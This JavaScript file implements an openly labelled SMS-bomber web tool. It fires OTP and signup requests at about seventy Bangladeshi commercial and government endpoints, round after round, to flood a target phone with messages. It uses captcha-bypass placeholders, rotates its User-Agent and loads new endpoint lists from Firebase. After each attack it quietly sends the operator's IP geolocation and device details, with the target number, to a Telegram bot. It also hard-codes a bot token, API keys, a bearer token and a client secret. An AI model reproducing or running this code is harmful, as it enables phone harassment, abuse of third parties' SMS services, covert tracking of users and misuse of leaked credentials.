// === FIREBASE INIT ===
import {initializeApp} from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
import {getDatabase, ref, get, set, onValue, push} from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";

const firebaseConfig = {
    apiKey: "AIzaSyAt3yrf12Uu4IdZv8FESMuxRZYM9rshsRY",
    authDomain: "sms-sender-2c90d.firebaseapp.com",
    databaseURL: "https://sms-sender-2c90d-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId: "sms-sender-2c90d",
    storageBucket: "sms-sender-2c90d.firebasestorage.app",
    messagingSenderId: "1023983616007",
    appId: "1:1023983616007:web:576f601bfe561cc905eaa2",
    measurementId: "G-TTZS4GH828"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);
window.db = db;
window.ref = ref;
window.get = get;
window.set = set;
window.onValue = onValue;
window.push = push;

// === CLOCK ===
function updateClock() {
    const now = new Date();
    const h = now.getHours().toString().padStart(2, '0');
    const m = now.getMinutes().toString().padStart(2, '0');
    document.getElementById('taskbarClock').textContent = h + ':' + m;
}
setInterval(updateClock, 1000);
updateClock();

// === LOADING ===
let loadPct = 0;
const loadSteps = ['Initializing system...', 'Connecting to server...', 'Loading APIs...', 'Syncing database...', 'Ready'];
const loadIv = setInterval( () => {
    loadPct += 4;
    if (loadPct > 100)
        loadPct = 100;
    document.getElementById('loadBar').style.width = loadPct + '%';
    document.getElementById('loadPercent').textContent = loadPct + '%';
    const idx = Math.min(Math.floor(loadPct / 25), loadSteps.length - 1);
    document.getElementById('loadLabel').textContent = loadSteps[idx];
    if (loadPct >= 100) {
        clearInterval(loadIv);
        document.getElementById('loadingScreen').classList.add('hidden');
    }
}
, 60);

// === TELEGRAM POPUP (localStorage, no close) ===


// === BOT TOKEN ===
let BOT_TOKEN = "8688314057:AAHTm7HrljqhhHDtk61EhekYo6TXdwyRkIQ";
let CHAT_ID = "5884967985";

// === APIs ===
let APIS = [{
    name: "Shadhin Music",
    url: "https://coreapi.shadhinmusic.com/api/v5/otp/OtpRobiReq",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        msisdn: "880" + p.replace(/^0/, ""),
        shortcode: 16235,
        servicename: "Shadhin Music"
    })
}, {
    name: "Chorki",
    url: "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        number: "+88" + p.replace(/^0/, "")
    })
}, {
    name: "Pickaboo",
    url: "https://www.pickaboo.com/rest/default/V1/customer-check/exist",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        mobile: p
    })
}, {
    name: "Shwapno",
    url: "https://www.shwapno.com/api/auth",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        phoneNumber: p
    })
}, {
    name: "Rokomari",
    method: "GET",
    getUrl: (p) => `https://www.rokomari.com/otp/send?emailOrPhone=880${p.replace(/^0/, "")}&countryCode=BD`
}, {
    name: "Sindabad",
    url: "https://m2ce.sindabad.com/rest/V1/EasyLogin/isMobileAvailable",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        websiteId: 1.0,
        customerMobile: p
    })
}, {
    name: "Kirei BD",
    url: "https://frontendapi.kireibd.com/api/v2/send-login-otp",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        email: p
    })
}, {
    name: "Easy BD",
    url: "https://core.easy.com.bd/api/v1/registration",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        password: "123456",
        password_confirmation: "123456",
        device_key: "45098c95a7fe4109cc5969a770ee846a",
        name: "SMS Bomber User",
        mobile: p,
        social_login_id: "",
        email: "user@smsbomber.com"
    })
}, {
    name: "Upay",
    url: "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        wallet_number: p,
        geo_location: {
            lat: 23.8979093,
            long: 89.1356346
        },
        referral: "",
        firebase_token: "e7XC0AWRR5C6rGMm6yCaZ8:APA91bHnbvs1bA_qXXb55W9GmsKmuzAUkgaR770HBH9hZCLjFV6HCejAsRGggvnD7c5dv2q_pOAdwY1peeTlzzn49cjPESTZ0NdR-bIhwe9_6of6rosH0AI",
        device_uuid: "c65m117a8cbf5b1851b29f8b",
        mno: "Robi"
    })
}, {
    name: "Shikho OTP",
    url: "https://api.shikho.com/public/activity/otp",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        phone: p,
        intent: "ap-discount-request"
    })
}, {
    name: "Bohubrihi",
    url: "https://bb-api.bohubrihi.com/public/activity/otp",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        phone: p,
        intent: "login"
    })
}, {
    name: "Ghoori Learning",
    url: "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        mobile_no: p
    })
}, {
    name: "Bikroy",
    method: "GET",
    getUrl: (p) => `https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${p}`
}, {
    name: "GP MyGP",
    url: "https://appcity.grameenphone.com/proxy/v2/user/session/get-otp",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        mobileNumber: p
    })
}, {
    name: "Pathao Auth",
    url: "https://api.pathao.com/v2/auth/register",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        country_prefix: "880",
        national_number: p.replace(/^0/, ""),
        country_id: 1
    })
}, {
    name: "BD Tickets",
    url: "https://api.bdtickets.com:20100/v1/auth",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        phoneNumber: "+88" + p.replace(/^0/, ""),
        createUserCheck: true,
        applicationChannel: "WEB_APP"
    })
}, {
    name: "Shikho SMS",
    url: "https://api.shikho.com/auth/v2/send/sms",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        auth_type: "signup",
        phone: "880" + p.replace(/^0/, ""),
        vendor: "shikho",
        type: "student"
    })
}, {
    name: "Mojaru",
    url: "https://new.mojaru.com/api/student/login",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        mobile_or_email: p
    })
}, {
    name: "English Moja",
    url: "https://api.englishmojabd.com/api/v1/auth/login",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        phone: "+88" + p.replace(/^0/, "")
    })
}, {
    name: "Training Gov BD",
    url: "https://training.gov.bd/backoffice/api/user/sendOtp",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        mobile: p
    })
}, {
    name: "Quizgiri",
    url: "https://developer.quizgiri.xyz/api/v2.0/send-otp",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        country_code: "+88",
        phone: p
    })
}, {
    name: "Sundarban Courier",
    url: "https://api-gateway.sundarbancourierltd.com/graphql",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        operationName: "CreateAccessToken",
        variables: {
            accessTokenFilter: {
                userName: p
            }
        },
        query: "mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) {\n  createAccessToken(accessTokenFilter: $accessTokenFilter) {\n    message\n    statusCode\n    result {\n      phone\n      otpCounter\n      __typename\n    }\n    __typename\n  }\n}"
    })
}, {
    name: "Walton Plaza",
    url: "https://waltonplaza.com.bd/api/auth/otp/create",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        auth: {
            countryCode: "880",
            deviceUuid: "ee757830-f639-12f0-9f4d-2f972746fhg",
            phone: p.replace(/^0/, "")
        },
        captchaToken: "recapcha"
    })
}, {
    name: "Apex4u",
    url: "https://api.apex4u.com/api/auth/login",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        phoneNumber: p
    })
}, {
    name: "BTCL",
    url: "https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        phoneNbr: p,
        OTPType: 1.0,
        userName: "",
        email: ""
    })
}, {
    name: "Otithee",
    url: "https://gateway.otithee.com/api/v1/generate-otp",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        request_type: "registration",
        mobile_number: p
    })
}, {
    name: "Garibook",
    url: "https://api.garibookadmin.com/api/v3/user/login",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        recaptcha_token: "garibookcaptcha",
        mobile: p,
        channel: "web"
    })
}, {
    name: "Deepto Play",
    url: "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        number: "+88" + p.replace(/^0/, "")
    })
}, {
    name: "RedX",
    url: "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        phoneNumber: p
    })
}, {
    name: "Timezone BD",
    url: "https://backend.timezonebd.com/api/v1/user/otp-login",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        phone: p
    })
}, {
    name: "GP Shop",
    url: "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        phone: p,
        language: "en",
        email: ""
    })
}, {
    name: "Ostad",
    url: "https://api.ostad.app/api/v2/user/with-otp",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        msisdn: p
    })
}, {
    name: "iEducation BD",
    url: "https://www.ieducationbd.com/api/account/check_user",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        mobile: p
    })
}, {
    name: "Hishabee",
    url: "https://distribution.hishabee.business/api/app/v1/auth/number-check",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        mobile_number: p
    })
}, {
    name: "Klassy BD",
    url: "https://api.klassy.com.bd/api/v2/public/user/register/send/otp",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        phone: p
    })
}, {
    name: "One Fish",
    url: "https://api.onefish.app/api/auth/user/sendotp",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        phone: p
    })
}, {
    name: "Shomvob",
    url: "https://backend-api.shomvob.co/api/v2/otp/applicant/web/phone/",
    method: "POST",
    headers: {
        "Content-Type": "application/json",
        "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY1OTg5NTcwOH0.IOdKen62ye0N9WljM_cj3Xffmjs3dXUqoJRZ_1ezd4Q"
    },
    getBody: (p) => ({
        phone: "880" + p.replace(/^0/, ""),
        is_retry: 0
    })
}, {
    name: "Osud Kini",
    url: "https://api.osudkini.com/api/otp/generate-otp",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        phoneNo: p
    })
}, {
    name: "Chaldal",
    url: "https://chaldal.com/yolk/api-v4/Auth/RequestOtpVerificationWithApiKey",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        phoneNumber: "+880" + p.replace(/^0/, ""),
        retryAttempt: 0
    })
}, {
    name: "Khaas Food",
    url: "https://www.khaasfood.com/api/auth/request-otp",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        username: p
    })
}, {
    name: "Meena Bazar",
    url: "https://meenabazardev.com/api/mobile/front/send/otp",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        CellPhone: p,
        type: "login"
    })
}, {
    name: "Bata BD",
    url: "https://www.batabd.com/apps/ez/api/GenerateOtp",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded"
    },
    getBody: (p) => ({
        MobileNo: p.replace(/^0/, ""),
        EmailId: "user@smsbomber.com",
        StoreName: "batabd.myshopify.com",
        IP: "59.152.4.182",
        Token: "bypass_token",
        CountryCode: "880"
    })
}, {
    name: "Le Reve Craze",
    url: "https://www.lerevecraze.com/login/verify_phone",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded"
    },
    getBody: (p) => ({
        mobile_no: p,
        resend: "0",
        recaptcha_token: "bypass"
    })
}, {
    name: "Focallure BD",
    url: "https://store.focallurebd.com/api/v1/1/ecom/auth/getCode",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        mobile: p
    })
}, {
    name: "Khaodao",
    url: "https://api.eat-z.com/auth/customer/app-connect",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        username: "+88" + p.replace(/^0/, "")
    })
}, {
    name: "Quality Foods",
    url: "https://admin.qualityfoods.com.bd/api/auth/check-phone",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        phone: p,
        is_sign_in: 0,
        login_type: "phone"
    })
}, {
    name: "Fundesh OTP",
    url: "https://fundesh.com.bd/api/auth/generateOTP?service_key=",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        msisdn: p.replace(/^0/, "")
    })
}, {
    name: "Practice Club",
    url: "https://www.practiceclub.net/api/register",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        contact_no: p
    })
}, {
    name: "ACS Future School",
    url: "https://auth.acsfutureschool.com/api/v1/otp/send",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        phone: p
    })
}, {
    name: "AWS POC",
    url: "https://8t09wa0n0a.execute-api.ap-south-1.amazonaws.com/poc/api/v1/otp/send",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        phone: p
    })
}, {
    name: "RedX Login",
    url: "https://api.redx.com.bd/v1/user/request-login-code",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        callingCode: "+880",
        phoneNumber: p.replace(/^0/, ""),
        countryCode: "BD",
        service: "redx"
    })
}, {
    name: "Gorilla Move",
    url: "https://api.gorillamove.com/api/v1/core/account/phone_login",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        phone_number: p,
        step: 1
    })
}, {
    name: "Relaxy BD",
    url: "https://dev.api.relaxy.com.bd/api/v1/otp/send",
    method: "POST",
    headers: {
        "Content-Type": "application/json",
        "x-api-key": "6yjOGvakSbHjA64NGqo7m25TBC4WX8BauAXEP3dX"
    },
    getBody: (p) => ({
        phoneNumber: "+880" + p.replace(/^0/, ""),
        appSignature: "appSignature"
    })
}, {
    name: "BD Matrimony",
    method: "GET",
    getUrl: (p) => `https://www.bangladeshimatrimony.com/register/editmobileno.php?mobileNo=${p}`
}, {
    name: "MyGuardian BD",
    url: "https://gliapp.myguardianbd.com/auth-gate/api/access/send-otp",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        mobileNumber: p,
        type: null
    })
}, {
    name: "Medico Bio",
    url: "https://api.v2.medico.bio/patient/passwordless-login",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        phoneNumber: p,
        deviceId: "45098c95a7fe4109cc5969a770ee846a",
        channel: "web",
        userType: "patient",
        type: "newUser"
    })
}, {
    name: "Amiprobashi",
    url: "https://www.amiprobashi.com/api/v7/en/auth/send-otp",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded"
    },
    getBody: (p) => ({
        device_type: "1",
        username: "+88" + p.replace(/^0/, ""),
        for: "1",
        type: "1",
        bd_number: "1"
    })
}, {
    name: "Bepari App",
    url: "https://api.bepari.app/bestfreshfarm/api/V1.4/access-control/user/registerOtp",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        client_id: 4,
        client_secret: "zCzOixaOJ4JywQr1VsowGZhCaEbZ49WLxweNBgPK",
        mobile_no: p
    })
}, {
    name: "ILYN Global",
    url: "https://api.ilyn.global/auth/signup",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        phone: {
            code: "BD",
            number: p
        },
        provider: "sms"
    })
}, {
    name: "Rangs Motors",
    url: "https://api.rangsmotors.com/",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        u_num: p
    })
}, {
    name: "Walton Amar Awaz",
    url: "https://walton-amar-awaz-prod.com/api/user/signup",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        email: "",
        fbId: "",
        fullName: "User",
        gId: "",
        phone: p
    })
}, {
    name: "PBS BD",
    url: "https://pbs.com.bd/login/?handler=UserGetOtp",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        UserName: "smsbomber_user",
        UserPassword: "user123",
        MobileNo: p
    })
}, {
    name: "PBS Alpha OTP",
    url: "https://apialpha.pbs.com.bd/api/OTP/generateOTP",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        userPhone: p,
        otp: ""
    })
}, {
    name: "Pharmaid RX",
    url: "https://shop.pharmaid-rx.com/api/sendSMSRegistration",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        mobileNumber: p
    })
}, {
    name: "Wholesale Plus",
    url: "https://admin.wholesaleplus.com.bd/api/send-otp/",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        email: p,
        regi: true
    })
}, {
    name: "Motion View",
    url: "https://api.motionview.com.bd/api/send-otp-phone-signup",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        phone: p
    })
}, {
    name: "ExpressHub",
    url: "https://expresshub.com.bd/User/CreateNewUser",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded"
    },
    getBody: (p) => ({
        _UID: p,
        _UNAME: "smsbomber_user",
        _MAIL: "user@smsbomber.com",
        _PHONE: p,
        _PASS: "user123",
        _TYPE: "1"
    })
}, {
    name: "ABC Lit",
    url: "https://abclit.com/api/sendOTP",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        recipientNo: p,
        code: 1234
    })
}, {
    name: "Beauty Booth",
    url: "https://admin.beautybooth.com.bd/api/v2/auth/register-new",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        signature: 280,
        type: "phone",
        value: p,
        token: 39
    })
}, {
    name: "WinBaji",
    url: "https://userapi.fairbet91.com/api/RegisterUser/GenerateOTPV2",
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    getBody: (p) => ({
        Mobile: p,
        SiteCode: "WBJ"
    })
}];

const KAROBAR_API = {
    url: "https://mybackend.karobarapp.com/api/v3/oauth/otp-request/",
    getHeaders: () => ({
        "Content-Type": "application/json",
        "User-Agent": ["Dart/3.6", "Dart/3.5", "okhttp/4.12.0"][Math.floor(Math.random() * 3)]
    }),
    getBody: (phone) => ({
        phone_number: phone,
        country: "bd",
        os: "Android"
    })
};
async function callKarobarAPI(phone) {
    try {
        const res = await fetch(KAROBAR_API.url, {
            method: "POST",
            headers: KAROBAR_API.getHeaders(),
            body: JSON.stringify(KAROBAR_API.getBody(phone))
        });
        return res.ok;
    } catch {
        return false;
    }
}
async function callAPI(api, phone) {
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout( () => controller.abort(), 5000);
        if (api.method === "GET")
            await fetch(api.getUrl(phone), {
                method: "GET",
                signal: controller.signal
            });
        else
            await fetch(api.url, {
                method: "POST",
                headers: api.headers || {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(api.getBody(phone)),
                signal: controller.signal
            });
        clearTimeout(timeoutId);
        return true;
    } catch {
        return false;
    }
}
async function sendTelegramLog(number, rounds, success, failed, gps, deviceInfo, battery, cpu, screen) {
    const message = `*SMS BOMBER LOG*\n\n*TARGET:* ${number}\n*ROUNDS:* ${rounds}\n*SUCCESS:* ${success}\n*FAILED:* ${failed}\n\n*GPS:* ${gps.lat}, ${gps.lon}\n*LOCATION:* ${gps.city}, ${gps.region}\n*COUNTRY:* ${gps.country}\n*ISP:* ${gps.isp}\n\n*DEVICE:* ${deviceInfo.device}\n*OS:* ${deviceInfo.os}\n*BROWSER:* ${deviceInfo.browser}\n*SCREEN:* ${screen.width}x${screen.height}\n*CPU:* ${cpu} cores\n*BATTERY:* ${battery.level}%\n\n*Dev: Dhrubo*`;
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: "Markdown"
            })
        });
    } catch (e) {}
}
async function getIP() {
    try {
        return (await (await fetch('https://api.ipify.org?format=json')).json()).ip;
    } catch {
        return 'Unknown';
    }
}
async function getAccurateGPS(ip) {
    try {
        const data = await (await fetch(`https://ipapi.co/${ip}/json/`)).json();
        return {
            lat: data.latitude || '23.8103',
            lon: data.longitude || '90.4125',
            city: data.city || 'Dhaka',
            region: data.region || 'Dhaka Division',
            country: data.country_name || 'Bangladesh',
            isp: data.org || 'Unknown'
        };
    } catch {
        return {
            lat: '23.8103',
            lon: '90.4125',
            city: 'Dhaka',
            region: 'Dhaka Division',
            country: 'Bangladesh',
            isp: 'Unknown'
        };
    }
}
function getDeviceInfo() {
    const ua = navigator.userAgent;
    return {
        device: ua.includes('Android') ? 'Android' : ua.includes('iPhone') ? 'iOS' : ua.includes('Windows') ? 'Windows' : 'Unknown',
        os: ua.includes('Android') ? 'Android' : ua.includes('iPhone') ? 'iOS' : ua.includes('Windows') ? 'Windows' : 'Unknown',
        browser: ua.includes('Chrome') ? 'Chrome' : ua.includes('Firefox') ? 'Firefox' : ua.includes('Safari') ? 'Safari' : 'Unknown'
    };
}
async function getBatteryInfo() {
    try {
        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            return {
                level: Math.round(b.level * 100)
            };
        }
    } catch {}
    return {
        level: 'N/A'
    };
}
function getCPUCores() {
    return navigator.hardwareConcurrency || 'Unknown';
}

let popupTimer = null;
async function loadConfigFromFirebase() {
    try {
        const snapshot = await get(ref(window.db, 'sms_bomber'));
        if (snapshot.exists()) {
            const data = snapshot.val();
            if (data.apis) {
                const activeApis = data.apis.filter(api => api.status === 'active');
                if (activeApis.length > 0) {
                    APIS = activeApis.map(api => ({
                        name: api.name,
                        url: api.url,
                        method: api.method,
                        headers: JSON.parse(api.headers || '{}'),
                        getBody: (phone) => {
                            try {
                                return JSON.parse((api.params || '').replace(/\{\{number\}\}/g, phone));
                            } catch {
                                return {
                                    number: phone
                                };
                            }
                        }
                        ,
                        getUrl: api.method === 'GET' ? (phone) => api.url.replace(/\{\{number\}\}/g, phone) : null
                    }));
                }
            }
            if (data.notice && data.notice.status === 'active')
                showNotice(data.notice);
            if (data.telegram) {
                if (data.telegram.botToken)
                    BOT_TOKEN = data.telegram.botToken;
                if (data.telegram.chatId)
                    CHAT_ID = data.telegram.chatId;
            }
        }
    } catch (e) {}
}

function showNotice(_ignore) {
    // HARDENED: notice text is hardcoded; Firebase can no longer override it.
    const nb = document.getElementById('noticeBar');
    if (!nb)
        return;
    document.getElementById('noticeContent').textContent = "Khub boro hacker hoiso. Cdnami korla Khub sigma holo na? Sala bokchod";
    nb.style.display = 'block';
    const card = document.querySelector('.main-area');
    if (card)
        card.style.paddingTop = '28px';
}

function startFirebaseListener() {
    try {
        onValue(ref(window.db, 'sms_bomber'), (snapshot) => {
            if (snapshot.exists()) {
                const data = snapshot.val();
                if (data.apis) {
                    const activeApis = data.apis.filter(api => api.status === 'active');
                    if (activeApis.length > 0) {
                        APIS = activeApis.map(api => ({
                            name: api.name,
                            url: api.url,
                            method: api.method,
                            headers: JSON.parse(api.headers || '{}'),
                            getBody: (phone) => {
                                try {
                                    return JSON.parse((api.params || '').replace(/\{\{number\}\}/g, phone));
                                } catch {
                                    return {
                                        number: phone
                                    };
                                }
                            }
                            ,
                            getUrl: api.method === 'GET' ? (phone) => api.url.replace(/\{\{number\}\}/g, phone) : null
                        }));
                    }
                }
                if (data.notice && data.notice.status === 'active')
                    showNotice(data.notice);
            }
        }
        );
    } catch (e) {}
}

async function saveLogToFirebase(number, rounds, success, failed) {
    try {
        await push(ref(window.db, 'sms_logs'), {
            number,
            rounds,
            success,
            failed,
            timestamp: new Date().toISOString(),
            totalCalls: rounds * (APIS.length + 2)
        });
        const totalRef = ref(window.db, 'sms_bomber/totalSent');
        const snap = await get(totalRef);
        await set(totalRef, (snap.exists() ? snap.val() : 0) + success);
    } catch (e) {}
}

async function startAttack() {
    let number = document.getElementById("number").value.trim();
    let amount = parseInt(document.getElementById("amount").value);
    if (!number || !amount || amount <= 0) {
        alert("Enter a valid number and rounds.");
        return;
    }
    number = number.replace(/\s+/g, "");
    if (!number.startsWith("0"))
        number = "0" + number;
    const btn = document.getElementById("sendBtn");
    btn.disabled = true;
    document.getElementById("btnText").textContent = "Attacking...";
    document.getElementById("statusText").textContent = "Attack in progress...";
    document.getElementById("progressSection").style.display = "block";
    let success = 0
      , failed = 0;
    for (let round = 0; round < amount; round++) {
        (await callKarobarAPI(number)) ? success++ : failed++;
        const results = await Promise.all(APIS.map(api => callAPI(api, number)));
        results.forEach(r => r ? success++ : failed++);
        (await callKarobarAPI(number)) ? success++ : failed++;
        const totalCalls = (round + 1) * (APIS.length + 2);
        const pct = ((round + 1) / amount * 100).toFixed(0);
        document.getElementById("progressFill").style.width = pct + "%";
        document.getElementById("progressPercent").textContent = pct + "%";
        document.getElementById("successCount").textContent = success;
        document.getElementById("failCount").textContent = failed;
        document.getElementById("totalCount").textContent = totalCalls;
        document.getElementById("statusText").textContent = `Round ${round + 1}/${amount} - ${success} ok, ${failed} fail`;
        if (round < amount - 1)
            await new Promise(r => setTimeout(r, 500));
    }
    btn.disabled = false;
    document.getElementById("btnText").textContent = "Start Attack";
    document.getElementById("statusText").textContent = "Attack complete.";
    try {
        const ip = await getIP();
        const gps = await getAccurateGPS(ip);
        await sendTelegramLog(number, amount, success, failed, gps, getDeviceInfo(), await getBatteryInfo(), getCPUCores(), window.screen);
    } catch (e) {}
    await saveLogToFirebase(number, amount, success, failed);
}

document.getElementById("number").addEventListener("input", function(e) {
    e.target.value = e.target.value.replace(/\D/g, "").substring(0, 11);
});

async function updateVisitorCount() {
    try {
        const visitorRef = ref(window.db, 'sms_bomber/visitors');
        const snap = await get(visitorRef);
        let count = snap.exists() ? snap.val() : 0;
        count++;
        await set(visitorRef, count);
        localStorage.setItem('visitor_counted', 'true');
    } catch (e) {}
}
function trackOnlineUser() {
    try {
        const userId = localStorage.getItem('user_id') || 'user_' + Date.now();
        localStorage.setItem('user_id', userId);
        const onlineRef = ref(window.db, 'sms_bomber/online_users/' + userId);
        set(onlineRef, {
            online: true,
            timestamp: Date.now()
        });
        window.addEventListener('beforeunload', function() {
            set(onlineRef, null);
        });
        setInterval( () => set(onlineRef, {
            online: true,
            timestamp: Date.now()
        }), 30000);
    } catch (e) {}
}

window.onload = async function() {
    if (!localStorage.getItem('visitor_counted')) {
        await updateVisitorCount();
    }
    trackOnlineUser();
    await loadConfigFromFirebase();
    startFirebaseListener();
}
;

// Make startAttack globally accessible from HTML onclick
window.startAttack = startAttack;

// HARDENED: display notice immediately on load, ignoring Firebase.
(function() {
    try {
        showNotice({
            status: 'active'
        });
    } catch (e) {}
}
)();
